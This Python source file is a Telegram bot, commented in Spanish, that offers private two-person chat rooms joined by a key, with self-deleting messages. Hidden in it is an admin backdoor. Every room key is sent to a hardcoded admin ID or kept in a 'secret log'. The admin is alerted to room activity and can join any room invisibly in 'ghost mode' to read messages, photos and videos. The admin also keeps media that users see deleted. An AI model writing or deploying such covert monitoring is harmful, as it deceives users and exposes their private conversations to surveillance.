import asyncio
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# --- CONFIGURACIÓN ---
TOKEN = 'TU_TOKEN_AQUI'
ADMIN_ID = 610413875 
# ---------------------

rooms = {} 
user_to_room = {}
waiting_for_key = set()
monitor_active = {}
# Nueva lista para guardar salas creadas mientras el monitor estaba OFF
offline_rooms_log = [] 

logging.basicConfig(level=logging.INFO)

# Botones
BTN_ENTRAR = '🔑 Entrar a Sala'
BTN_SALIR = '🚪 Salir de la Sala'
BTN_MONITOR = '🕵️ Monitor: ON/OFF'

async def delete_msg(context, chat_id, message_id, delay=0):
    if delay > 0: await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
    
    kb = [[BTN_ENTRAR]]
    if user_id == ADMIN_ID: kb.append([BTN_MONITOR])
    
    markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
    await update.message.reply_text("✨ **Modo Privado Listo**", reply_markup=markup)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    text = update.message.text

    # --- BOTÓN MONITOR (ADMIN) ---
    if text == BTN_MONITOR and user_id == ADMIN_ID:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        
        # Cambiar estado
        is_now_active = not monitor_active.get(user_id, False)
        monitor_active[user_id] = is_now_active
        
        estado = "ON (Modo Fantasma)" if is_now_active else "OFF (Solo alertas)"
        await update.message.reply_text(f"📡 Monitor: {estado}")

        # Si se acaba de activar, mostrar las salas creadas en el "pasado"
        if is_now_active:
            if offline_rooms_log:
                reporte = "📂 **Salas creadas mientras estabas en OFF:**\n\n"
                reporte += "\n".join([f"• `{r}`" for r in offline_rooms_log])
                await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
                offline_rooms_log.clear() # Limpiar log tras informar
            else:
                msg = await update.message.reply_text("✅ No hubo salas nuevas mientras estabas OFF.")
                asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
        return

    # --- BOTÓN SALIR ---
    if text == BTN_SALIR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        if user_id in user_to_room:
            room_name = user_to_room.pop(user_id)
            if room_name in rooms and user_id in rooms[room_name]["members"]:
                rooms[room_name]["members"].remove(user_id)
            
            kb = [[BTN_ENTRAR]]
            if user_id == ADMIN_ID: kb.append([BTN_MONITOR])
            markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
            await context.bot.send_message(chat_id=user_id, text="👋 Sesión finalizada.", reply_markup=markup)
        return

    # --- BOTÓN ENTRAR ---
    if text == BTN_ENTRAR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        waiting_for_key.add(user_id)
        msg = await update.message.reply_text("🔑 Escriba la clave:", reply_markup=ReplyKeyboardRemove())
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 10))
        return

    # --- PROCESAR CLAVE ---
    if user_id in waiting_for_key:
        room_key = text
        waiting_for_key.remove(user_id)
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        
        # Lógica de registro de salas nuevas
        if room_key not in rooms:
            rooms[room_key] = {"members": [], "pending": []}
            
            # Si el monitor está OFF, guardar en el log secreto
            if not monitor_active.get(ADMIN_ID, False):
                if room_key not in offline_rooms_log:
                    offline_rooms_log.append(room_key)
            else:
                # Si está ON, avisar al instante
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"📂 [NUEVA SALA]: `{room_key}`")
        
        room = rooms[room_key]
        is_admin_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))

        if not is_admin_ghost:
            if user_id not in room["members"] and len(room["members"]) >= 2:
                msg = await update.message.reply_text("🚫 Sala llena.")
                asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
                return
            if user_id not in room["members"]:
                room["members"].append(user_id)

        user_to_room[user_id] = room_key
        txt_status = "👻 Modo Fantasma Activo." if is_admin_ghost else "🔓 Sala activada."
        markup = ReplyKeyboardMarkup([[BTN_SALIR]], resize_keyboard=True, is_persistent=True)
        await update.message.reply_text(txt_status, reply_markup=markup)

        for item in list(room["pending"]):
            if is_admin_ghost or item["sender"] != user_id:
                await deliver_content(context, user_id, item, room_key, is_ghost=is_admin_ghost)
        return

    if user_id in user_to_room:
        await process_message(update, context)

async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    room_name = user_to_room[user_id]
    room = rooms[room_name]
    is_admin_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
    
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id, 2))
    
    if is_admin_ghost:
        msg = await update.message.reply_text("⚠️ En modo fantasma solo puedes observar.")
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
        return

    content_item = {"sender": user_id, "user_name": update.effective_user.first_name}
    if update.message.text: content_item.update({"type": "text", "content": update.message.text})
    elif update.message.photo: content_item.update({"type": "photo", "content": update.message.photo[-1].file_id})
    elif update.message.video: content_item.update({"type": "video", "content": update.message.video.file_id})
    else: return

    room["pending"].append(content_item)

    if user_id != ADMIN_ID:
        if monitor_active.get(ADMIN_ID, False):
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🕵️ Actividad en sala: `{room_name}`")
        else:
            await context.bot.send_message(chat_id=ADMIN_ID, text="🔔 Actividad detectada en el sistema.")

    others = [m for m in room["members"] if m != user_id]
    for m_id in others:
        n_msg = await context.bot.send_message(chat_id=m_id, text="📩 Tienes un mensaje nuevo.")
        asyncio.create_task(delete_msg(context, m_id, n_msg.message_id, 5))

async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
    msg_type, content = item["type"], item["content"]
    try:
        if msg_type == "text":
            sent = await context.bot.send_message(chat_id=chat_id, text=f"💬:\n{content}")
        elif msg_type == "photo":
            sent = await context.bot.send_photo(chat_id=chat_id, photo=content)
        elif msg_type == "video":
            sent = await context.bot.send_video(chat_id=chat_id, video=content)

        if not (chat_id == ADMIN_ID and msg_type in ["photo", "video"]):
            asyncio.create_task(delete_msg(context, chat_id, sent.message_id, 10))
        
        if not is_ghost and item["sender"] != chat_id:
            if item in rooms[room_name]["pending"]:
                rooms[room_name]["pending"].remove(item)
    except: pass

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, process_message))
    app.run_polling()